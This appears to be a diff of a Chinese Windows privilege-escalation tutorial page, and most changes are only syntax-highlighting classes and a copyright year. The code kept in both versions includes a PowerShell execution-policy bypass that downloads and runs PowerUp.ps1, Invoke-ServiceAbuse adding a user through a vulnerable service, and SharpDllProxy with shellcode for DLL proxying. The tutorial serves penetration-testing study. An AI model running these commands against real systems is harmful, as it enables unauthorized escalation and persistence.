@@ -433,9 +433,9 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;); Invoke-AllChecks&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-nop</span> <span class="n">-c</span> <span class="s2">&#34;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&#39;); Invoke-AllChecks&#34;</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}&#34;</span> <span class="p">&gt;</span> <span class="n">1</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module D:/PowerUp.ps1; Invoke-AllChecks}&#34;</span> <span class="p">&gt;</span> <span class="mf">1</span><span class="p">.</span><span class="n">txt</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>列出了所有可能存在问题的服务：</p>
@@ -468,7 +468,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name &#39;VGAuthService&#39; -Username user -Password 123456}&#34;</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span><span class="p">.</span><span class="py">exe</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-Command</span> <span class="s2">&#34;&amp; {Import-Module C:/PowerUp.ps1;Invoke-ServiceAbuse -Name &#39;VGAuthService&#39; -Username user -Password 123456}&#34;</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="313-metasploit">3.1.3 metasploit</h4>
@@ -543,7 +543,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select </span><span class="p">*</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="n">TaskPath</span> <span class="o">-notlike</span> <span class="s2">&#34;\Microsoft\Windows\*&#34;</span><span class="p">)</span> <span class="o">-And</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">UserId</span> <span class="o">-notlike</span> <span class="s2">&#34;*$env:UserName*&#34;</span><span class="p">)}</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-Property</span> <span class="n">State</span><span class="p">,</span> <span class="n">Actions</span><span class="p">,</span> <span class="n">Date</span><span class="p">,</span> <span class="n">TaskPath</span><span class="p">,</span> <span class="n">TaskName</span><span class="p">,</span> <span class="p">@{</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;User&#34;</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">userID</span><span class="p">}}</span> 
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ScheduledTask</span> <span class="p">|</span> <span class="nb">Select </span><span class="p">*</span> <span class="p">|</span> <span class="p">?</span> <span class="p">{(</span><span class="nv">$_</span><span class="p">.</span><span class="py">TaskPath</span> <span class="o">-notlike</span> <span class="s2">&#34;\Microsoft\Windows\*&#34;</span><span class="p">)</span> <span class="o">-And</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="py">Principal</span><span class="p">.</span><span class="py">UserId</span> <span class="o">-notlike</span> <span class="s2">&#34;*</span><span class="nv">$env:UserName</span><span class="s2">*&#34;</span><span class="p">)}</span> <span class="p">|</span> <span class="nb">Format-Table</span> <span class="n">-Property</span> <span class="n">State</span><span class="p">,</span> <span class="n">Actions</span><span class="p">,</span> <span class="n">Date</span><span class="p">,</span> <span class="n">TaskPath</span><span class="p">,</span> <span class="n">TaskName</span><span class="p">,</span> <span class="vm">@</span><span class="p">{</span><span class="n">Name</span><span class="p">=</span><span class="s2">&#34;User&#34;</span><span class="p">;</span><span class="n">Expression</span><span class="p">={</span><span class="nv">$_</span><span class="p">.</span><span class="py">Principal</span><span class="p">.</span><span class="n">userID</span><span class="p">}}</span> 
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>查看某个目录的权限配置情况</p>
@@ -611,7 +611,7 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="n">ps1</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Import-Module</span> <span class="p">.\</span><span class="n">PowerUp</span><span class="p">.</span><span class="py">ps1</span>
 </span></span><span class="line"><span class="cl"><span class="nb">Get-RegistryAlwaysInstallElevated</span>
 </span></span></code></pre></td></tr></table>
 </div>
@@ -926,7 +926,7 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SharpDllProxy.exe --dll /path/to/targetDLL.dll --payload shellcode.bin
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">SharpDllProxy</span><span class="o">.</span><span class="n">exe</span> <span class="o">--</span><span class="n">dll</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="n">to</span><span class="o">/</span><span class="n">targetDLL</span><span class="o">.</span><span class="n">dll</span> <span class="o">--</span><span class="n">payload</span> <span class="n">shellcode</span><span class="o">.</span><span class="n">bin</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
@@ -1181,7 +1181,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
